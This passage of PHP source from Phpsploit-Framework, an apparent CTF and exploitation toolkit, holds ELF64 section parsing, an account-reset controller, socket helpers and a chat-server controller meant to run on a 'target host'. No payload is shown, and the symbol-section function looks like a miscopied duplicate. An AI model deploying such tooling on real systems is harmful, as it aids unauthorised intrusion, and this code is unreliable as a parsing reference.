                                        substr ( $_section_header_content , Class_Base_Elf64_Section_Header::get_sh_link_offset () , Class_Base_Elf64_Section_Header::SIZE_SH_LINK ) ,
                                        substr ( $_section_header_content , Class_Base_Elf64_Section_Header::get_sh_info_offset () , Class_Base_Elf64_Section_Header::SIZE_SH_INFO ) ,
                                        substr ( $_section_header_content , Class_Base_Elf64_Section_Header::get_sh_addralign_offset () , Class_Base_Elf64_Section_Header::SIZE_SH_ADDRALIGN ) ,
                                        substr ( $_section_header_content , Class_Base_Elf64_Section_Header::get_sh_entsize_offset () , Class_Base_Elf64_Section_Header::SIZE_SH_ENTSIZE )
                                    );
                                    if ( intval ( $_section_header_object->get_sh_type () ) > 0 ) {
                                        $_section_info = Class_Base_Elf64_Section::get_section_content ( $file_path , $_section_header_object->get_sh_type () , $_section_header_object->get_sh_offset () , $_section_header_object->get_sh_size () , $_section_header_object->get_sh_name () );
                                        if ( $_section_info !== false ) {
                                            $_file_info[ "sections" ][ $_section_header_object->get_sh_offset () ] = $_section_info;
                                        }
                                    }
                                }
                            }
                            $_section_header_offset += $_section_header_size;
                        }
                    }
                }
                @fclose ( $_file_point );
                return $_file_info;
            }
        }
        return false;
    }

    public static function create_section_shstrtab ( $file_path , $file_header_object )
    {
        $_section_shstrtab_object = false;
        if ( ( is_string ( $file_path ) ) && ( strlen ( $file_path ) > 0 ) && ( file_exists ( $file_path ) ) && ( is_file ( $file_path ) ) && ( Class_Base_File::get_file_size ( $file_path ) > ( Class_Base_Elf64_File_Header::get_file_header_size () ) ) && ( is_object ( $file_header_object ) ) && ( ( $file_header_object instanceof Class_Base_Elf64_File_Header ) ) ) {
            $_file_point = @fopen ( $file_path , "rb" );
            if ( ! empty( $_file_point ) ) {
                $_section_header_count  = $file_header_object->get_section_header_count ();
                $_section_header_size   = Class_Base_Elf64_Section_Header::get_section_header_size ();
                $_section_header_offset = intval ( $file_header_object->get_section_header_offset () );
                for ( $section_header_index = 0 ; $section_header_index < $_section_header_count ; $section_header_index++ ) {
                    fseek ( $_file_point , $_section_header_offset , SEEK_SET );
                    $_section_header_content = @fread ( $_file_point , $_section_header_size );
                    if ( ! empty( $_section_header_content ) ) {
                        $_section_header_content_size = strlen ( $_section_header_content );
                        if ( $_section_header_size == $_section_header_content_size ) {
                            $_sh_type = ( ( Class_Base_Elf::unpack ( ( substr ( $_section_header_content , Class_Base_Elf64_Section_Header::get_sh_type_offset () , Class_Base_Elf64_Section_Header::SIZE_SH_TYPE ) ) , "V*" ) ) );
                            if ( ( $section_header_index == $file_header_object->get_e_shstrndx () ) && ( $_sh_type == 3 ) ) {
                                $_section_header_object   = Class_Base_Elf64_Section_Header::create_elf64_shdr (
                                    $file_path ,
                                    substr ( $_section_header_content , Class_Base_Elf64_Section_Header::get_sh_name_offset () , Class_Base_Elf64_Section_Header::SIZE_SH_NAME ) ,
                                    substr ( $_section_header_content , Class_Base_Elf64_Section_Header::get_sh_type_offset () , Class_Base_Elf64_Section_Header::SIZE_SH_TYPE ) ,
                                    substr ( $_section_header_content , Class_Base_Elf64_Section_Header::get_sh_flags_offset () , Class_Base_Elf64_Section_Header::SIZE_SH_FLAGS ) ,
                                    substr ( $_section_header_content , Class_Base_Elf64_Section_Header::get_sh_addr_offset () , Class_Base_Elf64_Section_Header::SIZE_SH_ADDR ) ,
                                    substr ( $_section_header_content , Class_Base_Elf64_Section_Header::get_sh_offset_offset () , Class_Base_Elf64_Section_Header::SIZE_SH_OFFSET ) ,
                                    substr ( $_section_header_content , Class_Base_Elf64_Section_Header::get_sh_size_offset () , Class_Base_Elf64_Section_Header::SIZE_SH_SIZE ) ,
                                    substr ( $_section_header_content , Class_Base_Elf64_Section_Header::get_sh_link_offset () , Class_Base_Elf64_Section_Header::SIZE_SH_LINK ) ,
                                    substr ( $_section_header_content , Class_Base_Elf64_Section_Header::get_sh_info_offset () , Class_Base_Elf64_Section_Header::SIZE_SH_INFO ) ,
                                    substr ( $_section_header_content , Class_Base_Elf64_Section_Header::get_sh_addralign_offset () , Class_Base_Elf64_Section_Header::SIZE_SH_ADDRALIGN ) ,
                                    substr ( $_section_header_content , Class_Base_Elf64_Section_Header::get_sh_entsize_offset () , Class_Base_Elf64_Section_Header::SIZE_SH_ENTSIZE )
                                );
                                $_section_shstrtab_object = Class_Base_Elf64_Section_Shstrtab::create_elf64_section_shstrtab ( $file_path , $_section_header_object );
                                $_section_header_object   = null;
                                break;
                            }
                        }
                    }
                    $_section_header_offset += $_section_header_size;
                }
                @fclose ( $_file_point );
            }
        }
        return $_section_shstrtab_object;
    }

    public static function create_section_syms ( $file_path , $file_header_object )
    {
        $_section_syms_object = false;
        if ( ( is_string ( $file_path ) ) && ( strlen ( $file_path ) > 0 ) && ( file_exists ( $file_path ) ) && ( is_file ( $file_path ) ) && ( Class_Base_File::get_file_size ( $file_path ) > ( Class_Base_Elf64_File_Header::get_file_header_size () ) ) && ( is_object ( $file_header_object ) ) && ( ( $file_header_object instanceof Class_Base_Elf64_File_Header ) ) ) {
            $_file_point = @fopen ( $file_path , "rb" );
            if ( ! empty( $_file_point ) ) {
                $_section_header_count  = $file_header_object->get_section_header_count ();
                $_section_header_size   = Class_Base_Elf64_Section_Header::get_section_header_size ();
                $_section_header_offset = intval ( $file_header_object->get_section_header_offset () );
                for ( $section_header_index = 0 ; $section_header_index < $_section_header_count ; $section_header_index++ ) {
                    fseek ( $_file_point , $_section_header_offset , SEEK_SET );
                    $_section_header_content = @fread ( $_file_point , $_section_header_size );
                    if ( ! empty( $_section_header_content ) ) {
                        $_section_header_content_size = strlen ( $_section_header_content );
                        if ( $_section_header_size == $_section_header_content_size ) {
                            $_sh_type = ( ( Class_Base_Elf::unpack ( ( substr ( $_section_header_content , Class_Base_Elf64_Section_Header::get_sh_type_offset () , Class_Base_Elf64_Section_Header::SIZE_SH_TYPE ) ) , "V*" ) ) );
                            if ( ( $section_header_index == $file_header_object->get_e_shstrndx () ) && ( $_sh_type == 3 ) ) {
                                $_section_header_object = Class_Base_Elf64_Section_Header::create_elf64_shdr (
                                    $file_path ,
                                    substr ( $_section_header_content , Class_Base_Elf64_Section_Header::get_sh_name_offset () , Class_Base_Elf64_Section_Header::SIZE_SH_NAME ) ,
                                    substr ( $_section_header_content , Class_Base_Elf64_Section_Header::get_sh_type_offset () , Class_Base_Elf64_Section_Header::SIZE_SH_TYPE ) ,
                                    substr ( $_section_header_content , Class_Base_Elf64_Section_Header::get_sh_flags_offset () , Class_Base_Elf64_Section_Header::SIZE_SH_FLAGS ) ,
                                    substr ( $_section_header_content , Class_Base_Elf64_Section_Header::get_sh_addr_offset () , Class_Base_Elf64_Section_Header::SIZE_SH_ADDR ) ,
                                    substr ( $_section_header_content , Class_Base_Elf64_Section_Header::get_sh_offset_offset () , Class_Base_Elf64_Section_Header::SIZE_SH_OFFSET ) ,
                                    substr ( $_section_header_content , Class_Base_Elf64_Section_Header::get_sh_size_offset () , Class_Base_Elf64_Section_Header::SIZE_SH_SIZE ) ,
                                    substr ( $_section_header_content , Class_Base_Elf64_Section_Header::get_sh_link_offset () , Class_Base_Elf64_Section_Header::SIZE_SH_LINK ) ,
                                    substr ( $_section_header_content , Class_Base_Elf64_Section_Header::get_sh_info_offset () , Class_Base_Elf64_Section_Header::SIZE_SH_INFO ) ,
                                    substr ( $_section_header_content , Class_Base_Elf64_Section_Header::get_sh_addralign_offset () , Class_Base_Elf64_Section_Header::SIZE_SH_ADDRALIGN ) ,
                                    substr ( $_section_header_content , Class_Base_Elf64_Section_Header::get_sh_entsize_offset () , Class_Base_Elf64_Section_Header::SIZE_SH_ENTSIZE )
                                );
                                $_section_syms_object   = Class_Base_Elf64_Section_Shstrtab::create_elf64_section_shstrtab ( $file_path , $_section_header_object );
                                $_section_header_object = null;
                                break;
                            }
                        }
                    }
                    $_section_header_offset += $_section_header_size;
                }
                @fclose ( $_file_point );
            }
        }
        return $_section_syms_object;
    }

    public static function elf64_hash ( $name )
    {
        $_h           = 0;
        $_name_length = strlen ( $name );
        for ( $index = 0 ; $index < $_name_length ; $index++ ) {
            $_h = ( ( $_h << 4 ) + ( ord ( substr ( $name , $index , 1 ) ) ) );
            if ( $_g = ( $_h & 0xf0000000 ) ) {
                $_h ^= ( $_g >> 24 );
            }
            $_h &= 0x0fffffff;
        }
        return $_h;
    }


}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_Shell extends Interface_Base
{

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-8
 * Time: 下午2:53
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Controller_Clear extends Class_Controller
{
    public static function index ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth::is_login () ) ) {
            Class_Base_Response::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth::check_permission ();
        $_start              = Class_Base_Request::form ( "start" , Class_Base_Request::TYPE_INTEGER , 0 );
        $_privilege_user     = Class_Base_Request::form ( "privilege_user" , Class_Base_Request::TYPE_STRING , "" );
        $_privilege_password = Class_Base_Request::form ( "privilege_password" , Class_Base_Request::TYPE_STRING , "" );
        if ( ! empty( $_start ) ) {
            $_privilege_user_length     = strlen ( $_privilege_user );
            $_privilege_password_length = strlen ( $_privilege_password );
            if ( $_privilege_user_length <= 0 ) {
                Class_Base_Response::outputln ( "Please enter the account name of the privileged account!" );
            }
            if ( $_privilege_password_length <= 0 ) {
                Class_Base_Response::outputln ( "Please enter the account password of the privileged account!" );
            }
            if ( Class_Operate_User::check_privilege_user_and_password_for_clear ( $_privilege_user , $_privilege_password ) ) {
                Class_Base_Auth::clear ();
                if ( Class_Base_Extension::exist_enabled_extensions ( Class_Base_Extension::EXTENSION_NAME_SHMOP ) ) {
                    Class_Controller_Memory::clear ();
                }
                if ( ! is_cli () ) {
                    Class_Base_Response::redirect ( "/login" );
                } else {
                    Class_Base_Response::outputln ( "If there are no unexpected circumstances, you have logged out and cleared the account information in the Phpsploit Framework software. However, due to other reasons such as access permissions, the cleaning of shared memory may also fail! After successfully clearing the shared memory information, if you need to use the Phpsploit Framework software again, you will need to access the initialization interface (/init) again to reinitialize your Phpsploit Framework software account information. After successful initialization, you will receive a new initial password and command line access token! When you fail to clear the shared memory information (mainly manifested as: you have already performed the/clear operation to clear the shared memory, but the next time you use the Phpsploit Framework software, you do not perform the initialization work again, but instead skip to the login interface), You may need to manually clear relevant shared memory information using IPC series commands (you can view the list of shared memory through ipcs -m, or use ipcrm -m <shm id> or ipcrm -M <shm key> to clear specified shared memory messages).You may need to perform ipcrm - M 0x5d8a0000 and ipcrm - M 0x5d8a0001 operations to repair the failure of/clear behavior in a command line environment! Note that 0x5d8a0000 and 0x5d8a0001 are not necessarily shared memory data of the Phpsploit Framework software, and may also be occupied by other software programs! You need to compare the feature information of the relevant shared memory data before making appropriate actions (note that for deletion operations, you should maintain a cautious attitude! Improper deletion behavior may lead to system or software crashes, or lead to adverse consequences such as damage or loss of system or software data!)! Under normal circumstances, the Phpsploit Framework software will use two key values, 0x5d8a0000 and 0x5d8a0001, in shared memory. The access permission value corresponding to the shared memory KEY key (0x5d8a0000) is an octal number (660), and the memory space usage size corresponding to the shared memory KEY key (0x5d8a0000) is a decimal number (32); The access permission value corresponding to the shared memory KEY key (0x5d8a0001) is an octal number (660), and the memory space occupation size corresponding to the shared memory KEY key (0x5d8a0001) is a decimal number (1048712);" );
                }
            } else {
                if ( ! is_cli () ) {
                    Class_Base_Response::outputln ( '<div style="width:100%;position: absolute;top:25%;font-size:26px;color:red;text-align: center;">Privileged user or password error! After 3 seconds, automatically return to the previous interface!</div><script type="text/javascript">setTimeout("history.back()",3000);</script>' );
                } else {
                    Class_Base_Response::outputln ( "Failed to verify the name and password information of the privileged account! Unable to call the \"/clear\" interface to reset the account information of the Phpsploit Framework software! You can try again after carefully verifying the name and password information of the privileged account. If the execution still fails, please contact the target host administrator who is conducting penetration testing or security audit behavior. The target host administrator will clean up the shared memory as appropriate (Note that under the condition of no unexpected or special circumstances, the shared memory resources used by the Phpsploit Framework software related to the software account are: 1. key=0x5d8a0000, perms=660, size=64; 2. key=0x5d8a0001, perms=660, size=1048712)!" );
                }
            }
            return null;
        }
        if ( ! is_cli () ) {
            $_cli_url        = Class_Base_Response::get_cli_url ( "/clear" , array ( "start" => 1 , "privilege_user" => $_privilege_user , "privilege_password" => $_privilege_password ) );
            $_cli_encode_url = Class_Base_Response::get_urlencode ( $_cli_url );
            $_form_top       = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Clean Up Authentication And Shared Memory Information</div>';
            $_form_top       .= '<div style="width:100%;word-break:break-all;margin-top:32px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This module function is mainly used to reset the account authentication and shared memory information of the Phpsploit Framework software, This module function requires the transmission of correct privileged account and password information! Incorrect account and password information will result in a failed cleanup action! After successfully clearing the shared memory information, if you need to use the Phpsploit Framework software again, you will need to access the initialization interface (/init) again to reinitialize your Phpsploit Framework software account information. After successful initialization, you will receive a new initial password and command line access token! When you fail to clear the shared memory information (mainly manifested as: you have already performed the/clear operation to clear the shared memory, but the next time you use the Phpsploit Framework software, you do not perform the initialization work again, but instead skip to the login interface), You may need to manually clear relevant shared memory information using IPC series commands (you can view the list of shared memory through ipcs -m, or use ipcrm -m <shm id> or ipcrm -M <shm key> to clear specified shared memory messages).You may need to perform ipcrm - M 0x5d8a0000 and ipcrm - M 0x5d8a0001 operations to repair the failure of/clear behavior in a command line environment! Note that 0x5d8a0000 and 0x5d8a0001 are not necessarily shared memory data of the Phpsploit Framework software, and may also be occupied by other software programs! You need to compare the feature information of the relevant shared memory data before making appropriate actions (note that for deletion operations, you should maintain a cautious attitude! Improper deletion behavior may lead to system or software crashes, or lead to adverse consequences such as damage or loss of system or software data!)! Under normal circumstances, the Phpsploit Framework software will use two key values, 0x5d8a0000 and 0x5d8a0001, in shared memory. The access permission value corresponding to the shared memory KEY key (0x5d8a0000) is an octal number (660), and the memory space usage size corresponding to the shared memory KEY key (0x5d8a0000) is a decimal number (32); The access permission value corresponding to the shared memory KEY key (0x5d8a0001) is an octal number (660), and the memory space occupation size corresponding to the shared memory KEY key (0x5d8a0001) is a decimal number (1048712).</div>';
            $_form_name      = "form_0";
            $_form           = array (
                "action"    => "/clear" ,
                "id"        => $_form_name ,
                "name"      => $_form_name ,
                "hiddens"   => array (
                    array (
                        "id"    => "start" ,
                        "name"  => "start" ,
                        "value" => 1 ,
                    ) ,
                ) ,
                "inputs"    => array (
                    array (
                        "id"       => "privilege_user" ,
                        "title"    => "( Privilege User ) : " ,
                        "describe" => "Privilege User" ,
                        "name"     => "privilege_user" ,
                        "value"    => $_privilege_user ,
                    ) ,
                    array (
                        "id"       => "privilege_password" ,
                        "title"    => "( Privilege Password ) : " ,
                        "describe" => "Privilege Password" ,
                        "name"     => "privilege_password" ,
                        "value"    => $_privilege_password ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "id"       => "cli_encode_url" ,
                        "title"    => "( Cli Encode URL )   : " ,
                        "name"     => "cli_encode_url" ,
                        "value"    => ( 'cli url : ' . $_cli_url . "\n\n" . 'cli encode url : ' . $_cli_encode_url . "\n\n" ) ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                ) ,
                "submit"    => array (
                    "id"    => "submit_form" ,
                    "type"  => "submit" ,
                    "title" => "( Clear )" ,
                    "name"  => "submit_form" ,
                    "value" => "clean up authentication and shared memory information" ,
                ) ,
                "reset"     => array (
                    "id"    => "reset_form" ,
                    "type"  => "reset" ,
                    "title" => "( Reset )" ,
                    "name"  => "reset_form" ,
                    "value" => "reset" ,
                ) ,
                "button"    => array (
                    "id"      => "button_form" ,
                    "type"    => "button" ,
                    "title"   => "( Create Connection Client Environment CLI Encode URL )" ,
                    "name"    => "button_form" ,
                    "value"   => "create cli encode url" ,
                    "display" => true ,
                    "events"  => array (
                        "onclick" => 'create_encode_url();' ,
                    ) ,
                ) ,
            );
            $_top            = Class_View_Top::top ();
            $_body           = array (
                "menu"    => Class_View_Shell_Menu::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View::form_body ( $_form ) ) ,
            );
            $_bottom_menu    = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content        = '<div></div>';
            $_javascript     = '<script type="text/javascript">function init(){ } function to_submit(form_object){  if(form_object.privilege_user.value==""){ alert("Privileged User cannot be empty!"); return false; } if(form_object.privilege_password.value==""){ alert("Privileged Password cannot be empty!"); return false; } console.log("form is submit"); return true;}function create_encode_url(){ document.getElementById("start").value=0;if(document.forms["' . htmlentities ( $_form_name ) . '"].onsubmit()!=false){document.forms["' . htmlentities ( $_form_name ) . '"].submit();} }</script>';
            $_bottom         = Class_View_Bottom::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response::output ( Class_View::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        return null;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 22-12-16
 * Time: 下午5:26
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Socket extends Class_Base implements Interface_Base_Socket
{
    const ERROR_CREATE    = 10001001;
    const ERROR_SET_BLOCK = 10001002;
    const ERROR_BIND      = 10001003;
    const ERROR_LISTEN    = 10001004;
    const ERROR_ACCEPT    = 10001005;
    const ERROR_CLOSE     = 10001006;
    const ERROR_READ      = 10001007;
    const ERROR_WRITE     = 10001008;
    const ERROR_CONNECT   = 10001009;
    const ERROR_SELECT    = 10001010;
    const ERROR_SEND      = 10001011;
    const ERROR_RECV      = 10001012;

    const EXCEPTION_MESSAGE_CONNECT_QUIT = "connect is exit";
    const EXCEPTION_MESSAGE_CONNECT_EXIT = "connect service is exit";
    const EXCEPTION_BREAK                = 1;

    private static $_is_nonblock = 0;

    public static function init ( $timeout = 0 )
    {
        set_time_limit ( intval ( $timeout ) );
    }

    public static function create ( $domain = AF_INET , $type = SOCK_STREAM , $protocol = SOL_TCP )
    {
        $sock = socket_create ( $domain , $type , $protocol );
        if ( ! $sock ) {
            throw new \Exception( "socket create : " . socket_strerror ( socket_last_error () ) , self::ERROR_CREATE );
        }
        return $sock;
    }

    public static function set_block ( $sock )
    {
        if ( empty( $sock ) ) {
            throw new \Exception( "socket set block : socket is null" , self::ERROR_SET_BLOCK );
        }
        $bool = socket_set_block ( $sock );
        if ( ! $bool ) {
            throw new \Exception( "socket set block : " . socket_strerror ( socket_last_error () ) , self::ERROR_SET_BLOCK );
        }
        return $bool;
    }

    public static function bind ( $sock , $address = "0.0.0.0" , $port = 40668 )
    {
        if ( empty( $sock ) ) {
            throw new \Exception( "socket bind : " . $address . ":" . $port . " socket is null" , self::ERROR_BIND );
        }
        $bool = socket_bind ( $sock , $address , $port );
        if ( ! $bool ) {
            throw new \Exception( "socket bind : " . socket_strerror ( socket_last_error () ) , self::ERROR_BIND );
        }
        return $bool;
    }

    public static function listen ( $sock , $backlog = 0 )
    {
        if ( empty( $sock ) ) {
            throw new \Exception( "socket listen : socket is null" , self::ERROR_LISTEN );

        }
        $bool = socket_listen ( $sock , $backlog );
        if ( ! $bool ) {
            throw new \Exception( "socket listen : " . socket_strerror ( socket_last_error () ) , self::ERROR_LISTEN );
        }
        return $bool;
    }

    public static function accept ( $sock )
    {
        if ( empty( $sock ) ) {
            throw new \Exception( "socket accept : socket is null" , self::ERROR_ACCEPT );
        }
        $connect = socket_accept ( $sock );
        if ( ! self::is_nonblock () ) {
            if ( empty( $connect ) ) {
                throw new \Exception( "socket accept : " . socket_strerror ( socket_last_error () ) , self::ERROR_ACCEPT );
            }
        }
        return $connect;
    }

    public static function connect ( $sock , $ip = "127.0.0.1" , $port = 40668 )
    {
        if ( empty( $sock ) ) {
            throw new \Exception( "socket connect : socket is null" , self::ERROR_SET_BLOCK );
        }
        $bool = socket_connect ( $sock , $ip , $port );
        if ( ! $bool ) {
            throw new \Exception( "socket connect : " . socket_strerror ( socket_last_error () ) , self::ERROR_CONNECT );
        }
        return $bool;
    }

    public static function select ( $sock , $tv_sec , $tv_usec = 0 )
    {
        if ( empty( $sock ) ) {
            throw new \Exception( "socket select : socket is null" , self::ERROR_SET_BLOCK );
        }
        $socks = array ( $sock );
        $count = socket_select ( $socks , $sockets , $sockets , $tv_sec , $tv_usec );
        if ( $count === false ) {
            throw new \Exception( "socket select : " . socket_strerror ( socket_last_error () ) , self::ERROR_SELECT );
        }
        return $count;
    }

    public static function getpeername ( $socket )
    {
        if ( is_resource ( $socket ) || is_object ( $socket ) ) {
            $_client           = array ();
            $_client[ "ip" ]   = "0.0.0.0";
            $_client[ "port" ] = 0;
            $_bool             = socket_getpeername ( $socket , $_client[ "ip" ] , $_client[ "port" ] );
            if ( empty( $_bool ) ) {
                return array ( "ip" => "0.0.0.0" , "port" => "0" , "socket" => null , "invitation_code" => 0 );
            }
            $_client[ "socket" ]          = $socket;
            $_client[ "invitation_code" ] = 0;
            return $_client;
        }
        return array ( "ip" => "0.0.0.0" , "port" => "0" , "socket" => null , "invitation_code" => 0 );
    }

    public static function close ( $sock )
    {
        if ( empty( $sock ) ) {
            throw new \Exception( "socket close : socket is null" , self::ERROR_CLOSE );
        }
        @socket_close ( $sock );
    }

    public static function read ( $sock , $length = 1024 , $type = PHP_BINARY_READ )
    {
        if ( empty( $sock ) ) {
            throw new \Exception( "socket read : socket is null" , self::ERROR_READ );
        }
        $data = socket_read ( $sock , $length , $type );
        if ( $data === false ) {
            throw new \Exception( "socket read : " . socket_strerror ( socket_last_error () ) , self::ERROR_READ );
        }
        return $data;
    }

    public static function receive ( $sock , $length = 1048576 , $flag = MSG_DONTWAIT )
    {
        $_buf    = null;
        $_length = socket_recv ( $sock , $_buf , $length , $flag );
        if ( $_length !== false ) {
            return $_buf;
        }
        return null;
    }

    public static function send ( $sock , $data , $length , $flags )
    {
        $_length = socket_send ( $sock , $data , $length , $flags );
        return $_length;
    }

    public static function write ( $sock , $data , $length = null )
    {
        if ( empty( $sock ) ) {
            throw new \Exception( "socket write : socket is null" , self::ERROR_WRITE );
        }
        if ( $length == null ) {
            $count = socket_write ( $sock , $data );
        } else {
            $count = socket_write ( $sock , $data , $length );
        }
        if ( $count === false ) {
            throw new \Exception( "socket write : " . socket_strerror ( socket_last_error () ) , self::ERROR_WRITE );
        }
        return $count;
    }

    public static function socket_set_nonblock ( $socket )
    {
        self::$_is_nonblock = 1;
        if ( is_resource ( $socket ) ) {
            stream_set_blocking ( $socket , false );
        }
        return socket_set_nonblock ( $socket );
    }

    public static function is_nonblock ()
    {
        if ( ! empty( self::$_is_nonblock ) ) {
            return true;
        }
        return false;
    }

    public static function is_socket ( $socket )
    {
        $_bool = Class_Base_Format::is_socket ( $socket );
        return $_bool;
    }

    public static function check_browser_service_stop ()
    {
        if ( ! is_cli () ) {
            while ( ob_get_level () ) {
                ob_end_clean ();
            }
            Class_Base_Response::outputln ( "" );
            flush ();
            if ( connection_aborted () ) {
                throw new \Exception( self::EXCEPTION_MESSAGE_CONNECT_EXIT , self::EXCEPTION_BREAK );
            }
        }
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-5-11
 * Time: 上午10:04
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Controller_Chat extends Class_Controller
{
    public static function index ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        if ( ! is_cli () ) {
            $_top    = Class_View_Top ::top ();
            $_body   = array (
                "menu"    => Class_View_Chat_Menu ::menu () ,
                "content" => "" ,
            );
            $_bottom = Class_View_Bottom ::bottom ();
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        return null;
    }

    public static function server_chat ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_start              = Class_Base_Request ::form ( "start" , Class_Base_Request::TYPE_INTEGER , 0 );
        $_listen_ip          = Class_Base_Request ::form ( "ip" , Class_Base_Request::TYPE_STRING , "" );
        $_listen_port        = Class_Base_Request ::form ( "port" , Class_Base_Request::TYPE_INTEGER , 0 );
        $_max_connect_number = Class_Base_Request ::form ( "max_connect_number" , Class_Base_Request::TYPE_INTEGER , 20 );
        $_max_execute_time   = Class_Base_Request ::form ( "max_execute_time" , Class_Base_Request::TYPE_INTEGER , 3600 );
        $_cli_url            = Class_Base_Response ::get_cli_url ( "/chat/server_chat" , array ( "start" => 1 , "ip" => $_listen_ip , "port" => $_listen_port , "max_connect_number" => $_max_connect_number , "max_execute_time" => $_max_connect_number ) );
        $_cli_encode_url     = Class_Base_Response ::get_urlencode ( $_cli_url );
        $_result             = "";
        if ( empty( $_start ) ) {
            $_result .= ( 'cli url : ' . $_cli_url ) . "\n\n" . ( 'cli encode url : ' . ( $_cli_encode_url ) ) . "\n\n";
        }
        $_connect_domain_List_id = "result_data";
        if ( ! is_cli () ) {
            $_form_top    = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Combat Meeting Room</div>';
            $_form_top    .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This module is based on the C/S architecture pattern and provides a typical chat environment between the client and server (both communication ends use RSA protocol to encrypt chat content, ensuring maximum communication security of chat content). The client is written in JAVA language, and the server is implemented in PHP language (due to the limitations of PHP language itself, the technical implementation of the server is still in further optimization). In CTF competitions, if you feel that public chat software may be breached and utilized by red teams, then in special scenarios, this module function can also become another option worth considering (although the server implementation, even the author himself, thinks it is not perfect ^ _ ^).Warning! When you start a server chat environment instance in the web interface, other functions in the current web environment will become unusable! If the target host for your current penetration testing or security audit behavior is still running other businesses, you should never use this feature in the web environment, as it will make other businesses in the web environment unusable! The functionality of this module is currently only applicable to web environments without other business operations, as well as relatively independent command-line environments!</div>';
            $_form_name   = "form_0";
            $_form        = array (
                "action"    => "/chat/server_chat" ,
                "id"        => $_form_name ,
                "name"      => $_form_name ,
                "hiddens"   => array (
                    array (
                        "id"    => "start" ,
                        "name"  => "start" ,
                        "value" => 1 ,
                    ) ,
                ) ,
                "inputs"    => array (
                    array (
                        "id"       => "listen_ip" ,
                        "title"    => "( Listen IP Address ) : " ,
                        "describe" => "listen IP Address" ,
                        "name"     => "ip" ,
                        "value"    => ( ( ! empty( $_listen_ip ) ) ? ( $_listen_ip ) : ( '127.0.0.1' ) ) ,
                    ) ,
                    array (
                        "id"       => "listen_port" ,
                        "title"    => "( Listen IP Port ) : " ,
                        "describe" => "listen IP Port" ,
                        "name"     => "port" ,
                        "value"    => ( ( ! empty( $_listen_port ) ) ? ( $_listen_port ) : ( rand ( 40000 , 49999 ) ) ) ,
                    ) ,
                    array (
                        "id"       => "max_connect_number" ,
                        "title"    => "( Max Connect Number ) : " ,
                        "describe" => "Max Connect Number" ,
                        "name"     => "max_connect_number" ,
                        "value"    => $_max_connect_number ,
                    ) ,
                    array (
                        "id"       => "max_execute_time" ,
                        "title"    => "( Max Execute Time ) : " ,
                        "describe" => "Max Execute Time" ,
                        "name"     => "max_execute_time" ,
                        "value"    => $_max_execute_time ,
